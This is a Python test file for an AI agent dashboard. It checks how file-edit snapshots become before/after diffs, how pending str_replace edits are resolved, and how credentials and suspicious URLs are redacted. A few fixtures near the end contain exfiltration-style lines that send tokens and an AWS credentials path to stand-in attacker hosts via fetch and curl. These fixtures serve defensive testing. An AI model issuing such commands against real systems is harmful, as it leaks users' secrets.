    TOOL = "tc-1"

    def _snapshot(self, path: Path, on_disk: str, slot: _ChatSlot) -> dict:
        path.write_text(on_disk)
        snap = _snapshot_write_target(
            {**self.PARAMS, "path": str(path)},
            diff_old_text=self.PARAMS["oldStr"],
            diff_path=str(path),
        )
        assert snap is not None
        _bind_pending_str_replace(snap, self.TOOL, slot)
        slot._file_changes = [snap]
        return snap

    def _flush(
        self, slot: _ChatSlot, path: Path, on_disk_at_flush: str, outcome: str | None
    ) -> dict:
        if outcome is not None:
            _settle_pending_str_replace_outcome(slot, self.TOOL, completed=outcome == "completed")
        path.write_text(on_disk_at_flush)
        _flush_file_changes(slot)
        return slot.messages[-1]["meta"]["file_changes"][0]

    def test_snapshot_taken_before_the_write_resolves_to_disk_content(self, short_tmp_dir: Path):
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        snap = self._snapshot(f, self.BEFORE, slot)
        # Undecidable at snapshot time: fragment now, hypotheses pending.
        assert snap["content"] == self.PARAMS["oldStr"]
        assert snap["pending_str_replace"]["if_post_write"].content == self.BEFORE
        assert snap["pending_str_replace"]["if_pre_write"].content == self.AFTER
        assert snap["pending_str_replace"]["tool_call_id"] == _tcid_identity_key(self.TOOL)
        entry = self._flush(slot, f, self.AFTER, outcome="completed")
        assert entry["before"] == self.BEFORE
        assert entry["after"] == self.AFTER

    def test_pending_payload_is_capped(self, short_tmp_dir: Path, monkeypatch):
        """The payload retains only truncated hypotheses, never the raw disk
        read — an ambiguous edit of a large file costs no more than an ordinary
        snapshot."""
        import kiro_crew.dashboard.chat_runner as cr

        monkeypatch.setattr(cr, "_MAX_SNAPSHOT", 64)
        marker = f"\n... (truncated at {cr._MAX_SNAPSHOT} chars)"
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        snap = self._snapshot(f, "x" * 4096 + self.BEFORE, slot)

        pending = snap["pending_str_replace"]
        assert set(pending) == {"if_post_write", "if_pre_write", "before_if_post", "tool_call_id"}
        for key, value in pending.items():
            if key == "tool_call_id":
                continue
            assert value.truncated is True
            assert len(value.content) <= cr._MAX_SNAPSHOT + len(marker)

    def test_resolved_before_keeps_its_truncation_state(self, short_tmp_dir: Path, monkeypatch):
        """An edit inside the capped prefix of an oversized file still resolves,
        and the entry is flagged incomplete like any other truncated snapshot."""
        import kiro_crew.dashboard.chat_runner as cr

        monkeypatch.setattr(cr, "_MAX_SNAPSHOT", 64)
        monkeypatch.setattr(cr, "_SNAPSHOT_READ_BYTES", 4 * 64 + 4)
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        snap = self._snapshot(f, self.BEFORE + "x" * 4096, slot)
        expected_before = snap["pending_str_replace"]["if_post_write"]
        assert expected_before.truncated is True
        entry = self._flush(slot, f, self.AFTER + "x" * 4096, outcome="completed")
        assert entry["before"] == expected_before.content
        assert entry["truncated"] is True
        assert entry["snapshot_limit_chars"] == 64

    def test_later_write_restoring_snapshot_content_keeps_fragment(self, short_tmp_dir: Path):
        """A second tool call restores the snapshot content, so the turn-end
        after matches the post-write hypothesis for an edit whose snapshot was
        actually pre-write — resolving it would fabricate a before."""
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        self._snapshot(f, self.BEFORE, slot)
        _settle_pending_str_replace_outcome(slot, self.TOOL, completed=True)
        slot._file_changes.append({"path": str(f), "content": self.AFTER, "tool_call_id": "tc-2"})
        f.write_text(self.BEFORE)

        _flush_file_changes(slot)

        entry = slot.messages[-1]["meta"]["file_changes"][0]
        assert entry["before"] == self.PARAMS["oldStr"]
        assert entry["after"] == self.BEFORE

    def test_later_write_under_another_spelling_keeps_fragment(self, short_tmp_dir: Path):
        """The restoring write names the same file as ``dir/./rc``: one inode,
        two backend-authored spellings, still two writers of one path."""
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        self._snapshot(f, self.BEFORE, slot)
        _settle_pending_str_replace_outcome(slot, self.TOOL, completed=True)
        alias = f"{short_tmp_dir}/./rc"
        assert alias != str(f)
        slot._file_changes.append({"path": alias, "content": self.AFTER, "tool_call_id": "tc-2"})
        f.write_text(self.BEFORE)

        _flush_file_changes(slot)

        changes = slot.messages[-1]["meta"]["file_changes"]
        assert len(changes) == 1
        assert changes[0]["path"] == str(f)
        assert changes[0]["before"] == self.PARAMS["oldStr"]
        assert changes[0]["after"] == self.BEFORE

    def test_same_tool_call_second_snapshot_still_resolves(self, short_tmp_dir: Path):
        """One write is snapshotted at both the tool_call and tool_call_update
        sites when the backend repeats ``rawInput`` — same tool call, so the
        deferred resolution still runs."""
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        self._snapshot(f, self.BEFORE, slot)
        second = {"path": str(f), "content": self.BEFORE}
        _bind_pending_str_replace(second, self.TOOL, slot)
        slot._file_changes.append(second)
        _settle_pending_str_replace_outcome(slot, self.TOOL, completed=True)
        f.write_text(self.AFTER)

        _flush_file_changes(slot)

        entry = slot.messages[-1]["meta"]["file_changes"][0]
        assert entry["before"] == self.BEFORE
        assert entry["after"] == self.AFTER

    def test_second_snapshot_without_tool_call_id_keeps_fragment(self, short_tmp_dir: Path):
        """An unidentified snapshot cannot be attributed to the pending
        payload's tool call, so it counts as a distinct writer."""
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        self._snapshot(f, self.BEFORE, slot)
        slot._file_changes.append({"path": str(f), "content": self.BEFORE})
        _settle_pending_str_replace_outcome(slot, self.TOOL, completed=True)
        f.write_text(self.AFTER)

        _flush_file_changes(slot)

        entry = slot.messages[-1]["meta"]["file_changes"][0]
        assert entry["before"] == self.PARAMS["oldStr"]

    def test_snapshot_taken_after_the_write_is_already_proven(self, short_tmp_dir: Path):
        """Post-write, oldStr is gone, so reversal proves the state at
        snapshot time and nothing is deferred."""
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        snap = self._snapshot(f, self.AFTER, slot)
        assert "pending_str_replace" not in snap
        entry = self._flush(slot, f, self.AFTER, outcome="completed")
        assert entry["before"] == self.BEFORE
        assert entry["after"] == self.AFTER

    def test_append_style_edit_resolves(self, short_tmp_dir: Path):
        """oldStr ⊂ newStr (the mirror shape): here it is the POST-write disk
        state that is valid as both (oldStr still occurs once inside newStr),
        so the deferral happens on the other side of the write."""
        f = short_tmp_dir / "cfg"
        after = "head\nvalue = 1  # tuned\ntail\n"
        f.write_text(after)
        params = {
            "command": "strReplace",
            "path": str(f),
            "oldStr": "value = 1",
            "newStr": "value = 1  # tuned",
        }
        snap = _snapshot_write_target(params, diff_old_text="value = 1", diff_path=str(f))
        assert snap is not None and "pending_str_replace" in snap
        slot = _make_slot_with_assistant_message()
        _bind_pending_str_replace(snap, self.TOOL, slot)
        slot._file_changes = [snap]
        entry = self._flush(slot, f, after, outcome="completed")
        assert entry["before"] == "head\nvalue = 1\ntail\n"
        assert entry["after"] == after

    def test_rejected_write_keeps_the_fragment(self, short_tmp_dir: Path):
        """The user rejects the permission-gated write: the file is unchanged,
        which reads exactly like the post-write state. Without the tool's
        outcome the resolver would fabricate a before for an edit that never
        landed; a refused/failed frame drops the pending payload instead."""
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        self._snapshot(f, self.BEFORE, slot)
        entry = self._flush(slot, f, self.BEFORE, outcome="refused")
        assert entry["before"] == self.PARAMS["oldStr"]
        assert entry["after"] == self.BEFORE

    def test_no_terminal_frame_keeps_the_fragment(self, short_tmp_dir: Path):
        """A turn cancelled before the tool reports never confirms the write,
        so an unchanged file is not read as post-write."""
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        self._snapshot(f, self.BEFORE, slot)
        entry = self._flush(slot, f, self.BEFORE, outcome=None)
        assert entry["before"] == self.PARAMS["oldStr"]

    def test_outcome_of_another_tool_call_is_ignored(self, short_tmp_dir: Path):
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        snap = self._snapshot(f, self.BEFORE, slot)
        _settle_pending_str_replace_outcome(slot, "tc-other", completed=True)
        assert "completed" not in snap["pending_str_replace"]
        _settle_pending_str_replace_outcome(slot, "tc-other", completed=False)
        assert "pending_str_replace" in snap

    def test_outcome_recorded_before_the_snapshot_is_bound(self, short_tmp_dir: Path):
        """One tool_call_update can carry the first rawInput AND the terminal
        status; the dispatcher emits the tool_result before the refinement, so
        the outcome lands on the slot first and bind picks it up."""
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        _settle_pending_str_replace_outcome(slot, self.TOOL, completed=True)
        snap = self._snapshot(f, self.BEFORE, slot)
        assert snap["pending_str_replace"]["completed"] is True
        entry = self._flush(slot, f, self.AFTER, outcome=None)
        assert entry["before"] == self.BEFORE

        slot = _make_slot_with_assistant_message()
        _settle_pending_str_replace_outcome(slot, self.TOOL, completed=False)
        snap = self._snapshot(f, self.BEFORE, slot)
        assert "pending_str_replace" not in snap

    def test_bind_consumes_the_recorded_outcome(self, short_tmp_dir: Path):
        """The terminal frame is the last event of a call, so the snapshot that
        binds after it is the last reader of the recorded outcome."""
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        _settle_pending_str_replace_outcome(slot, self.TOOL, completed=True)
        assert slot._write_tool_outcomes == {_tcid_identity_key(self.TOOL): True}
        snap = self._snapshot(f, self.BEFORE, slot)
        assert snap["pending_str_replace"]["completed"] is True
        assert slot._write_tool_outcomes == {}

    def test_outcome_map_is_capped(self):
        """Every tool's terminal frame records an outcome and only a write's
        later snapshot consumes one, so a long turn of unrelated tool calls must
        not grow the map without bound."""
        import kiro_crew.dashboard.chat_runner as cr

        slot = _make_slot_with_assistant_message()
        slot._file_changes = []
        for i in range(cr._MAX_WRITE_TOOL_OUTCOMES + 8):
            _settle_pending_str_replace_outcome(slot, f"tc-{i}", completed=True)
        assert len(slot._write_tool_outcomes) == cr._MAX_WRITE_TOOL_OUTCOMES
        assert _tcid_identity_key("tc-0") not in slot._write_tool_outcomes
        newest = _tcid_identity_key(f"tc-{cr._MAX_WRITE_TOOL_OUTCOMES + 7}")
        assert newest in slot._write_tool_outcomes

    def test_outcome_map_keys_are_bounded_digests(self, short_tmp_dir: Path):
        """The ids come from the backend, so the map keeps a fixed-size digest
        of each one -- the same ``_tcid_identity_key`` every other per-turn id
        table uses -- and never the id itself."""
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        _settle_pending_str_replace_outcome(slot, self.TOOL, completed=True)
        (key,) = slot._write_tool_outcomes
        assert key == _tcid_identity_key(self.TOOL)
        assert key != self.TOOL and len(key) == 16
        snap = self._snapshot(f, self.BEFORE, slot)
        assert snap["tool_call_id"] == key
        assert snap["pending_str_replace"]["completed"] is True
        assert slot._write_tool_outcomes == {}

    def test_over_long_tool_call_id_is_retained_nowhere(self, short_tmp_dir: Path):
        """An id past ``_MAX_TCID_LEN`` identifies nothing: the terminal frame
        records no outcome for it, a snapshot bound to it stays unidentified,
        and the flush treats that snapshot as an unattributable writer."""
        import kiro_crew.dashboard.chat_runner as cr

        huge = "t" * (cr._MAX_TCID_LEN + 1)
        assert _tcid_identity_key(huge) == ""
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        _settle_pending_str_replace_outcome(slot, huge, completed=True)
        assert slot._write_tool_outcomes == {}

        f.write_text(self.BEFORE)
        snap = _snapshot_write_target(
            {**self.PARAMS, "path": str(f)},
            diff_old_text=self.PARAMS["oldStr"],
            diff_path=str(f),
        )
        assert snap is not None
        _bind_pending_str_replace(snap, huge, slot)
        assert snap["tool_call_id"] == ""
        assert "tool_call_id" not in snap["pending_str_replace"]
        assert huge not in repr(snap)
        slot._file_changes = [snap]
        _settle_pending_str_replace_outcome(slot, huge, completed=True)
        assert "completed" not in snap["pending_str_replace"]
        f.write_text(self.AFTER)
        _flush_file_changes(slot)
        entry = slot.messages[-1]["meta"]["file_changes"][0]
        assert entry["before"] == self.PARAMS["oldStr"]

    def test_flush_clears_the_outcome_map(self, short_tmp_dir: Path):
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        self._snapshot(f, self.BEFORE, slot)
        self._flush(slot, f, self.AFTER, outcome="completed")
        assert slot._write_tool_outcomes == {}
        assert slot._file_changes == []

    def test_flush_clears_the_outcome_map_on_a_no_write_turn(self):
        """The map is per-turn state, and a turn that wrote nothing takes the
        early return — so the reset cannot live at the end of the body."""
        slot = _make_slot_with_assistant_message()
        slot._file_changes = []
        _settle_pending_str_replace_outcome(slot, self.TOOL, completed=True)
        assert slot._write_tool_outcomes == {_tcid_identity_key(self.TOOL): True}

        _flush_file_changes(slot)

        assert slot._write_tool_outcomes == {}

    def test_unbound_snapshot_is_never_resolved(self, short_tmp_dir: Path):
        """No tool_call_id on the frame: nothing can confirm the write, so the
        fragment stands even when the after matches a hypothesis."""
        f = short_tmp_dir / "rc"
        f.write_text(self.BEFORE)
        snap = _snapshot_write_target(
            {**self.PARAMS, "path": str(f)},
            diff_old_text=self.PARAMS["oldStr"],
            diff_path=str(f),
        )
        assert snap is not None
        slot = _make_slot_with_assistant_message()
        _bind_pending_str_replace(snap, "", slot)
        assert "tool_call_id" not in snap["pending_str_replace"]
        slot._file_changes = [snap]
        f.write_text(self.AFTER)
        _flush_file_changes(slot)
        entry = slot.messages[-1]["meta"]["file_changes"][0]
        assert entry["before"] == self.PARAMS["oldStr"]

    def test_file_changed_again_keeps_the_fragment(self, short_tmp_dir: Path):
        """Neither hypothesis matches the turn-end content (a later edit in
        the same turn) → no guess; the fragment fallback stands."""
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        self._snapshot(f, self.BEFORE, slot)
        entry = self._flush(slot, f, "something else entirely\n", outcome="completed")
        assert entry["before"] == self.PARAMS["oldStr"]

    def test_pending_payload_never_reaches_message_meta(self, short_tmp_dir: Path):
        f = short_tmp_dir / "rc"
        slot = _make_slot_with_assistant_message()
        self._snapshot(f, self.BEFORE, slot)
        entry = self._flush(slot, f, self.AFTER, outcome="completed")
        assert set(entry) == {"path", "before", "after"}

    def test_decided_snapshot_carries_no_pending(self, short_tmp_dir: Path):
        """A provable state (newStr absent → pre-write) needs no deferral."""
        f = short_tmp_dir / "plain"
        f.write_text("OLD\n")
        snap = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert snap == {"path": str(f), "content": "OLD\n", "truncated": False}


class TestPendingStrReplaceThroughTheTurnLoop:
    """The deferred resolution wired through the real ``_run_chat`` event loop.

    The helpers above are exercised on their own; these drive the two call
    sites in the turn loop — the snapshot bind on ``tool_call`` /
    ``tool_call_update`` and the outcome settlement on the terminal
    ``tool_result`` — so the chip resolves only when both are wired.
    """

    TOOL = "tc-write-1"
    PARAMS = TestPendingStrReplaceResolution.PARAMS
    BEFORE = TestPendingStrReplaceResolution.BEFORE
    AFTER = TestPendingStrReplaceResolution.AFTER

    def _state(self, tmp_path):
        from chat_test_helpers import _make_state

        state = _make_state(tmp_path)
        state.broadcast_ws = MagicMock()
        state.broadcast_ws_owners = MagicMock()
        state.push_slots_update = MagicMock()
        state.push_refresh = MagicMock()
        state.context_builder = None
        state.consolidator = None
        state._hook_store = None
        state._yolo = False
        state.slack_client = None
        return state

    async def _drive(
        self,
        state,
        slot,
        events,
        path: Path,
        write_after: int | None,
        writes: dict[int, str] | None = None,
    ):
        """Stream ``events`` and apply each requested write after its event."""
        from unittest.mock import AsyncMock

        from kiro_crew.dashboard import chat_runner

        async def _stream(_msg):
            for i, ev in enumerate(events):
                yield ev
                if writes is not None and i in writes:
                    path.write_text(writes[i])
                elif i == write_after:
                    path.write_text(self.AFTER)

        client = MagicMock()
        client.stream = _stream
        client.stream_command = _stream
        client.context_usage_pct = MagicMock(return_value=1.0)
        client.client = None
        state.sessions.get_or_create = AsyncMock(return_value=(client, True, False))
        await chat_runner._run_chat(state, slot, "drop the A export")
        task = getattr(slot, "task", None)
        if task is not None:
            await task

    def _file_change(self, slot) -> dict:
        changes = [
            m["meta"]["file_changes"]
            for m in slot.messages
            if m.get("role") == "assistant" and (m.get("meta") or {}).get("file_changes")
        ]
        assert len(changes) == 1
        assert len(changes[0]) == 1
        return changes[0][0]

    def _prepare(self, short_tmp_dir: Path):
        from kiro_crew.acp.types import EVENT_COMPLETE, EVENT_TEXT_CHUNK, AcpEvent

        f = short_tmp_dir / "rc"
        f.write_text(self.BEFORE)
        params = {**self.PARAMS, "path": str(f)}
        tail = [AcpEvent(kind=EVENT_TEXT_CHUNK, text="Done."), AcpEvent(kind=EVENT_COMPLETE)]
        return f, params, tail

    @pytest.mark.asyncio
    async def test_snapshot_before_the_terminal_frame_resolves(self, tmp_path, short_tmp_dir: Path):
        """tool_call carries rawInput (bind), the write lands, tool_result
        settles: the chip shows the full-file before."""
        from kiro_crew.acp.types import EVENT_TOOL_CALL, EVENT_TOOL_RESULT, AcpEvent

        f, params, tail = self._prepare(short_tmp_dir)
        events = [
            AcpEvent(
                kind=EVENT_TOOL_CALL,
                tool_call_id=self.TOOL,
                title="write",
                tool_name="write",
                raw_tool_params=params,
                diff_old_text=self.PARAMS["oldStr"],
                diff_path=str(f),
            ),
            AcpEvent(
                kind=EVENT_TOOL_RESULT,
                tool_call_id=self.TOOL,
                tool_output="ok",
                tool_final=True,
                tool_status="completed",
            ),
            *tail,
        ]
        state = self._state(tmp_path)
        slot = state.get_or_create_slot("chip-bind-then-settle")
        slot._titled = True

        await self._drive(state, slot, events, f, write_after=0)

        entry = self._file_change(slot)
        assert entry["before"] == self.BEFORE
        assert entry["after"] == self.AFTER
        assert slot._write_tool_outcomes == {}

    @pytest.mark.asyncio
    async def test_snapshot_after_the_terminal_frame_resolves(self, tmp_path, short_tmp_dir: Path):
        """tool_call streams no rawInput; the refinement that carries it follows
        the terminal tool_result, so the bind reads the recorded outcome."""
        from kiro_crew.acp.types import (
            EVENT_TOOL_CALL,
            EVENT_TOOL_CALL_UPDATE,
            EVENT_TOOL_RESULT,
            AcpEvent,
        )

        f, params, tail = self._prepare(short_tmp_dir)
        events = [
            AcpEvent(
                kind=EVENT_TOOL_CALL, tool_call_id=self.TOOL, title="write", tool_name="write"
            ),
            AcpEvent(
                kind=EVENT_TOOL_RESULT,
                tool_call_id=self.TOOL,
                tool_output="ok",
                tool_final=True,
                tool_status="completed",
            ),
            AcpEvent(
                kind=EVENT_TOOL_CALL_UPDATE,
                tool_call_id=self.TOOL,
                title="write",
                tool_name="write",
                raw_tool_params=params,
                diff_old_text=self.PARAMS["oldStr"],
                diff_path=str(f),
            ),
            *tail,
        ]
        state = self._state(tmp_path)
        slot = state.get_or_create_slot("chip-settle-then-bind")
        slot._titled = True

        await self._drive(state, slot, events, f, write_after=2)

        entry = self._file_change(slot)
        assert entry["before"] == self.BEFORE
        assert entry["after"] == self.AFTER

    @pytest.mark.asyncio
    async def test_refused_write_keeps_the_fragment(self, tmp_path, short_tmp_dir: Path):
        from kiro_crew.acp.types import EVENT_TOOL_CALL, EVENT_TOOL_RESULT, AcpEvent

        f, params, tail = self._prepare(short_tmp_dir)
        events = [
            AcpEvent(
                kind=EVENT_TOOL_CALL,
                tool_call_id=self.TOOL,
                title="write",
                tool_name="write",
                raw_tool_params=params,
                diff_old_text=self.PARAMS["oldStr"],
                diff_path=str(f),
            ),
            AcpEvent(
                kind=EVENT_TOOL_RESULT,
                tool_call_id=self.TOOL,
                tool_output="refused",
                tool_status="refused",
            ),
            *tail,
        ]
        state = self._state(tmp_path)
        slot = state.get_or_create_slot("chip-refused")
        slot._titled = True

        await self._drive(state, slot, events, f, write_after=None)

        entry = self._file_change(slot)
        assert entry["before"] == self.PARAMS["oldStr"]
        assert entry["after"] == self.BEFORE

    @pytest.mark.asyncio
    async def test_redaction_colliding_write_ids_keep_fragment(self, tmp_path, short_tmp_dir: Path):
        """Distinct calls that redact to one id cannot prove one writer.

        The first ambiguous edit is followed by a second write that restores the
        snapshot content. Treating their redacted ids as one writer would settle
        the first payload and persist a fabricated full-file before.
        """
        from kiro_crew.acp.types import EVENT_TOOL_CALL, EVENT_TOOL_RESULT, AcpEvent
        from kiro_crew.dashboard.chat_utils import _redact_tool_field

        jwt_head = "eyJhbGciOiJIUzI1NiJ9"
        jwt_sig = "s" * 20
        first_id = f"{jwt_head}.{'a' * 30}.{jwt_sig}"
        second_id = f"{jwt_head}.{'b' * 30}.{jwt_sig}"
        assert first_id != second_id
        assert _redact_tool_field(first_id) == _redact_tool_field(second_id)

        f, params, tail = self._prepare(short_tmp_dir)
        restore_params = {
            "command": "strReplace",
            "path": str(f),
            "oldStr": self.AFTER,
            "newStr": self.BEFORE,
        }
        events = [
            AcpEvent(
                kind=EVENT_TOOL_CALL,
                tool_call_id=first_id,
                title="write",
                tool_name="write",
                raw_tool_params=params,
                diff_old_text=self.PARAMS["oldStr"],
                diff_path=str(f),
            ),
            AcpEvent(
                kind=EVENT_TOOL_CALL,
                tool_call_id=second_id,
                title="write",
                tool_name="write",
                raw_tool_params=restore_params,
                diff_old_text=self.AFTER,
                diff_path=str(f),
            ),
            AcpEvent(
                kind=EVENT_TOOL_RESULT,
                tool_call_id=first_id,
                tool_output="ok",
                tool_final=True,
                tool_status="completed",
            ),
            AcpEvent(
                kind=EVENT_TOOL_RESULT,
                tool_call_id=second_id,
                tool_output="ok",
                tool_final=True,
                tool_status="completed",
            ),
            *tail,
        ]
        state = self._state(tmp_path)
        slot = state.get_or_create_slot("chip-redacted-id-collision")
        slot._titled = True

        await self._drive(
            state,
            slot,
            events,
            f,
            write_after=None,
            writes={0: self.AFTER, 1: self.BEFORE},
        )

        entry = self._file_change(slot)
        assert entry["before"] == self.PARAMS["oldStr"]
        assert entry["after"] == self.BEFORE
        assert "pending_str_replace" not in entry


class TestNoOpPassThrough:
    """No-op entries (before == after) are surfaced, not dropped.

    The dashboard renders an explicit "no changes" caption for them; a
    backend drop would compare post-truncation/post-redaction content and
    silently discard real changes past the snapshot limit or inside
    redacted spans.
    """

    def test_noop_write_is_surfaced(self, short_tmp_dir: Path):
        """A write with identical before/after still generates an entry
        (the frontend labels it "no changes")."""
        d = short_tmp_dir
        f = d / "unchanged.py"
        f.write_text("same content\n")
        slot = _make_slot_with_assistant_message()
        # Before content (from content block) == after content (on disk)
        slot._file_changes = [{"path": str(f), "content": "same content\n"}]
        _flush_file_changes(slot)
        meta = slot.messages[-1].get("meta", {})
        assert "file_changes" in meta
        changes = meta["file_changes"]
        assert len(changes) == 1
        assert changes[0]["before"] == changes[0]["after"] == "same content\n"

    def test_noop_and_real_change_both_surfaced(self, short_tmp_dir: Path):
        """No-op and real-change entries both survive the flush."""
        d = short_tmp_dir
        changed = d / "changed.py"
        changed.write_text("new content\n")
        unchanged = d / "unchanged.py"
        unchanged.write_text("same\n")

        slot = _make_slot_with_assistant_message()
        slot._file_changes = [
            {"path": str(changed), "content": "old content\n"},
            {"path": str(unchanged), "content": "same\n"},  # no-op
        ]
        _flush_file_changes(slot)
        meta = slot.messages[-1].get("meta", {})
        assert "file_changes" in meta
        changes = {c["path"]: c for c in meta["file_changes"]}
        assert len(changes) == 2
        assert changes[str(changed)]["before"] == "old content\n"
        assert changes[str(changed)]["after"] == "new content\n"
        assert changes[str(unchanged)]["before"] == changes[str(unchanged)]["after"]

    def test_flush_always_resets_accumulator(self, short_tmp_dir: Path):
        """The accumulator is cleared on every flush path, so an all-no-op
        turn can never leak its entries into a later turn and misattribute a
        stale entry."""
        d = short_tmp_dir
        f = d / "a.py"
        f.write_text("content_a\n")

        slot = _make_slot_with_assistant_message()
        slot._file_changes = [{"path": str(f), "content": "content_a\n"}]
        _flush_file_changes(slot)
        assert slot._file_changes == []


class TestContentBlockRedactionAndTruncation:
    """Verify that content-block-sourced before text gets the same
    redaction and truncation treatment as disk-sourced text."""

    def test_truncation_applies_to_diff_old_text(self, tmp_path: Path):
        """Large content from a content block is capped at _MAX_SNAPSHOT."""
        f = tmp_path / "huge.py"
        f.write_text("short after\n")

        # Simulate a very large before-content from the content block
        huge_before = "x" * (_MAX_SNAPSHOT + 500)
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f)},
            diff_old_text=huge_before,
            diff_path=str(f),
        )
        assert result is not None
        assert len(result["content"]) < len(huge_before)
        assert "(truncated at" in result["content"]
        assert result["content"].startswith("x" * 100)

    def test_redaction_applies_to_content_block_before_in_flush(self, short_tmp_dir: Path):
        """Credentials in content-block-sourced 'before' are redacted by
        _flush_file_changes, just like disk-sourced content."""
        d = short_tmp_dir
        f = d / "config.yml"
        # After content is different (clean) so the entry isn't dropped as no-op
        f.write_text("aws_access_key_id=REPLACED_SAFELY\nversion=2\n")

        slot = _make_slot_with_assistant_message()
        # Before content contains a credential (from content block)
        slot._file_changes = [
            {"path": str(f), "content": "aws_access_key_id=AKIAIOSFODNN7EXAMPLE\n"}
        ]
        _flush_file_changes(slot)
        meta = slot.messages[-1].get("meta", {})
        assert "file_changes" in meta
        changes = meta["file_changes"]
        # The AKIA key in before must be scrubbed
        assert "AKIAIOSFODNN7EXAMPLE" not in changes[0]["before"]

    def test_chip_scrub_is_the_exfil_first_composition(self, short_tmp_dir: Path):
        """A long-query exfil URL in chip content loses its WHOLE url.

        `redact_exfiltration_urls` classifies partly by query length and
        replaces the entire url; a hand-sequenced creds-first pair here would
        shorten `?token=<long>` first and defeat it, leaking the destination
        and payload parameters into the chip diff (the same seam
        `discover.py`'s TestRedactExternalLayerOrder pins). The scrub must
        stay the canonical `security.redact()` composition.
        """
        d = short_tmp_dir
        f = d / "notes.md"
        f.write_text("clean after\n")
        exfil = (
            "fetch https://collect.attacker.example/?token="
            + "aB3" * 70
            + "&host=corp-laptop&path=/home/alice/.aws/credentials\n"
        )
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [{"path": str(f), "content": exfil}]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        before = changes[0]["before"]
        assert "corp-laptop" not in before
        assert "/home/alice/.aws/credentials" not in before
        assert "?token=" not in before
        assert "[REDACTED: suspicious URL to collect.attacker.example]" in before

    def test_sensitive_path_refused_even_with_diff_old_text(self):
        """Even when diff_old_text is provided, sensitive paths are refused
        — credentials must never enter message meta regardless of source."""
        result = _snapshot_write_target(
            {"command": "strReplace", "path": "~/.aws/credentials"},
            diff_old_text="[default]\naws_access_key_id=AKIAEXAMPLE\n",
            diff_path="~/.aws/credentials",
        )
        # Must be None — sensitive path refusal takes priority
        assert result is None

    def test_exfil_url_redacted_in_content_block_before(self, short_tmp_dir: Path):
        """Exfiltration URLs in content-block before text are scrubbed."""
        d = short_tmp_dir
        f = d / "script.sh"
        # After content is clean
        f.write_text("echo 'clean'\n")

        slot = _make_slot_with_assistant_message()
        # Before has an exfiltration URL pattern
        slot._file_changes = [
            {"path": str(f), "content": "curl https://evil.com/exfil?data=secret\n"}
        ]
        _flush_file_changes(slot)
        meta = slot.messages[-1].get("meta", {})
        # If redact_exfiltration_urls masks the URL, it should differ from raw
        # The entry should still exist (before != after)
        assert "file_changes" in meta
